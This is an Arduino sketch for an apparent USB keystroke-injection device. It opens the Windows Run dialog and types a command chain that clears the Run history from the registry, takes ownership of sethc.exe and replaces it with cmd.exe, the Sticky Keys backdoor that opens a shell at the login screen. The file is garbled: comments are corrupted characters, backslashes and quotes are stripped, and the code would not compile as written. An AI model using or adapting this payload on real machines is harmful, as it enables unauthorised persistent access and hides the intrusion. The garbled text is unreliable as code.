void setup() {��ʼ��
  delay(5000);��ʱ
  Keyboard.press(KEY_LEFT_GUI);win�� 
  delay(500); 
  Keyboard.press('r');r�� 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println(CMD C START MIN REG DELETE hkcusOFTWAREmICROSOFTwINDOWScURRENTvERSIONeXPLORERrUNmru F&TAKEOWN F %sYSTEMrOOT%SYSTEM32SETHC.EXE&ECHO YCACLS %sYSTEMrOOT%SYSTEM32SETHC.EXE g %username%f&COPY CWINDOWSSYSTEM32CMD.EXE CWINDOWSSYSTEM32SETHC.EXE y);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();��������ͨѶ 
}
void loop()ѭ��
{
}